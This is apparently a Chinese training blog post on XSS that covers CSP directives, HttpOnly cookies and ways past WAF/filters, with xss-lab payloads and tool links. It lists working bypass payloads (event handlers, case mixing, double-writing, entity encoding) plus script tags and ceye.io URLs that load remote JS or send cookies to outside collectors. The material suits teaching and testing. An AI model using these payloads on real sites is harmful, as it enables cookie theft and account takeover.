---
title: XSS跨站&CSP策略&HttpOnly属性&Filter代码&符号标签&AI绕过&工具项目
published: 2026-06-30T18:00:00
description: XSS的防御与绕过，涵盖CSP策略配置、HttpOnly防护机制及WAF过滤的多种绕过手法（如标签事件、编码混淆、双写绕过等）。XSStrike、Chypass_pro自动化测试工具
tags:
  - Web攻防
  - XSS
category: 网络安全
draft: false
---

# 知识点

1. Web攻防-XSS跨站-安全防护&CSP&Httponly&WAF等
2. Web攻防-XSS跨站-工具项目&XSStrike&Chypass_pro

# CSP

内容安全策略是一种可信白名单机制，来限制网站中是否可以包含某来源内容。

该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，

它的实现和执行全部由浏览器完成，开发者只需提供配置。

禁止加载外域代码，防止复杂的攻击逻辑。

禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。

禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。

禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。

合理使用上报可以及时发现XSS，利于尽快修复问题。

## CSP的结构

> CSP由一组指令组成，每个指令用于指定允许加载的资源类型和来源，一个CSP头由多组CSP策略组成，中间由分号分隔。

> 1. 指令关键字：指令关键字用于标识指令类型，例如`default-src`、`script-src`、`style-src`等。
> 2. 指令值：指令值用于指定允许加载资源的来源，可以是一个或多个来源，多个来源之间用空格分隔。来源可以是URL、域名、IP地址或通配符等。
> 3. 指令选项：指令选项用于指定一些特殊行为，例如`'self'`选项用于指定资源只能从同一域名加载，`'unsafe-inline'`选项用于允许内联脚本等。
> 4. 指令策略：指令策略用于指定如何处理不符合CSP策略的请求，可以选择`'allow'`、`'block'`、`'report'`等选项，每一组策略包含一个策略指令和一个内容源列表。

## 示例CSP策略

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' example.com; img-src * data:; report-uri /csp-report
```

> 1. Content-Security-Policy是CSP的header字段
> 2. `default-src`指令用于限制默认允许加载的资源类型和来源，这里指定只允许从同一域名加载资源。
> 3. `script-src`指令用于限制JavaScript脚本的来源，这里指定允许从同一域名加载和允许内联脚本，并允许从`example.com`域名加载。
> 4. `img-src`指令用于限制图片的来源，这里指定允许从任何来源加载图片和data URI。
> 5. 策略还指定了违规报告的URL，任何不符合CSP策略的请求将被报告到`/csp-report`。

## CSP中常见的策略指令

> 这些指令可以与特定的源（例如域名、协议、端口）一起使用，也可以使用通配符`（*）`来表示所有来源。

> 1. `default-src`: 指定默认允许加载的资源类型和来源。
> 2. `script-src`: 限制JavaScript脚本的来源。
> 3. `style-src`: 限制CSS样式表的来源。
> 4. `img-src`: 限制图片的来源。
> 5. `connect-src`: 限制XMLHttpRequest和WebSocket的来源。
> 6. `font-src`: 限制字体的来源。
> 7. `object-src`: 限制object、embed、applet等插件的来源。
> 8. `media-src`: 限制音频、视频等媒体资源的来源。
> 9. `frame-src`: 限制iframe的来源。
> 10. `child-src`: 限制子窗口的来源，包括iframe、web worker、embed等。
> 11. `form-action`: 限制表单提交的目标地址。
> 12. `sandbox`: 限制iframe中的脚本和插件的执行权限。
> 13. `base-uri`: 限制base标签的目标地址。
> 14. `report-uri`: 指定违规报告的URL。

## CSP策略指令中常见的关键词

> CSP策略指令包含一些关键词，这些关键词用于指定资源的类型和来源。

> 1. `self`: 表示当前网站的源，也就是只允许从同一域名加载资源。
> 2. `none`: 表示不允许加载任何资源。
> 3. `unsafe-inline`: 表示允许内联脚本、样式表等，但存在安全风险。
> 4. `unsafe-eval`: 表示允许使用`eval()`函数执行代码，但存在安全风险。
> 5. `strict-dynamic`: 表示允许通过`nonce`或`hash`机制执行动态脚本，但不允许其他方式的动态脚本。
> 6. `nonce-xxxx`: 表示允许执行指定的`nonce`值所对应的脚本，用于限制内联脚本的来源。
> 7. `hash-xxxx`: 表示允许执行指定的哈希值所对应的脚本，用于限制外部脚本的来源。
> 8. `data:`: 表示允许加载data URI格式的资源。
> 9. `blob:`: 表示允许加载blob URL格式的资源。
> 10. `mediastream:`: 表示允许加载mediastream格式的资源。

实验：

## 设置任何域JS加载

```php
header( "Content-Security-Policy:default-src 'self'; script-src * ");
```

```js
<script src="http://www.xiaodi8.com/x.js"></script>
```

## 设置本地域JS加载

绕过利用条件：文件上传JS绕过

```php
header( "Content-Security-Policy:default-src 'self'; script-src 'self' ");
```

```js
// 无法加载 
<script src="http://www.xiaodi8.com/x.js"></script>
// 本地目录下正常加载
<script src="x.js"></script>
```

## 设置本地域JS外加限制目录

绕过利用条件1：目录有302跳转绕过

绕过利用条件2：文件上传JS（指定目录）

```php
header( "Content-Security-Policy:default-src 'self'; script-src 'http://xxx/xx/static/' ");
```

```js
// 无法加载 
<script src="http://www.xiaodi8.com/x.js"></script>
// 无法加载
<script src="x.js"></script>
// 指定目录下正常加载
<script src="static/x.js"></script>
```

http://92oigl.ceye.io?cookie=TEST_COOKIE_123&url=TEST_URL

http://92oigl.ceye.io?x=test

### 目标存在302跳转绕过

假设存在url传参

```php
<?php Header( header:"location:".$_GET['url'])?>
```

实际上的url还是指向了上级目录下的js文件

```js
<script src="static/302.php?url=../x.js"></script>
```

## 其他绕过技术

参考：[https://xz.aliyun.com/news/11816](https://xz.aliyun.com/news/11816)

# http_only

查看有没有启用http_only黑盒情况下：**只需要在打开的站点f12查看存储Cookie栏中的HttpOnly值就可以**

一个可以在设置Cookie时使用的标记;当一个Cookie被标记为HttpOnly时，JavaScript无法访问该Cookie，只能通过HTTP（或HTTPS）协议传输。

这一特性有助于防止跨站脚本攻击（XSS），因为攻击者无法通过JavaScript代码窃取存储在 HttpOnly Cookie中的敏感信息。

实验：

1. 开启HttpOnly时XSS窃取Cookie的加载情况

```php
// 设置HttpOnly Cookie
// name 启用httponly true
setcookie('name','xiaodi',time() + 3600,'','',false,true);
// pass 启用httponly false
setcookie('pass','123456',time() + 3600,'','',false,true);
```

使用js代码打印出当前浏览器cookie

```html
<!--
<script>alert(document.cookie);</script>
-->
<sCRiPt sRC="//uj.ci/ssz"></sCRiPt>
```

2. 未开启HttpOnly时XSS窃取Cookie的加载情况

```php
// 设置HttpOnly Cookie
// name 启用httponly true
setcookie('name','xiaodi',time() + 3600,'','',false,false);
// pass 启用httponly false
setcookie('pass','123456',time() + 3600,'','',false,false);
```

使用js代码打印出当前浏览器cookie

```html
<!--
<script>alert(document.cookie);</script>
-->
<sCRiPt sRC="//uj.ci/ssz"></sCRiPt>
```

绕过：有但鸡肋

(1) CVE-2012-0053

(2) PHPINFO页面

(3) Flash/Java

参考：blog.csdn.net/weixin_42478365/article/details/116597222

思路：一般遇到网站启用`httponly`后，可以不用继续死磕获取`cookie`了，建议采用其他方式（如钓鱼，模拟提交、浏览器攻击框架等）

# WAF或代码Filter

黑盒XSS手工分析：

-页面中显示的数据找可控的（有些隐藏的）

-利用可控地方发送JS代码去看执行加载情况

-成功执行即XSS，不能成功就看语句输出的地方显示（过滤）

-根据显示分析为什么不能执行（实体化，符号括起来，关键字被删除等）

## 人工分析

演示：xss-lab（关卡）

https://xz.aliyun.com/t/4067

https://xz.aliyun.com/news/11816

https://github.com/Re13orn/xss-lab

blog.csdn.net/2301_80031208/article/details/139159525

演示：

https://xss.xiejiahe.com/

### 无任何过滤

```js
<script>alert()</script>
```

### 实体化 输入框没有

```js
"> <script>alert()</script> <"
```

### 全部实体化 利用标签事件 单引号闭合

```js
" onfocus=javascript:alert() "
```

### 全部实体化 利用标签事件 双引号闭合

```js
" onfocus=javascript:alert() "
```

### 事件关键字过滤 利用其他标签调用 双引号闭合

```js
"> <a href=javascript:alert()>xxx</a> <"
```

### 利用大小写未正则匹配

```js
"> <sCript>alert()</sCript> <"
```

### 利用双写绕过匹配

```js
"> <a hrehreff=javascript:alert()>x</a> <"
```

### 利用Unicode编码

```
&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0029
```

### 利用Unicode编码（内容检测）

```
&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0029;('http://')
```

### 隐藏属性触发闭合

```js
<script>alert('xss')</script>&t_sort=" type="text" onclick="alert('xss')
```

11-20

https://blog.csdn.net/l2872253606/article/details/125638898

## 工具项目

https://github.com/s0md3v/XSStrike

https://github.com/wxwhhh/Chypass_pro
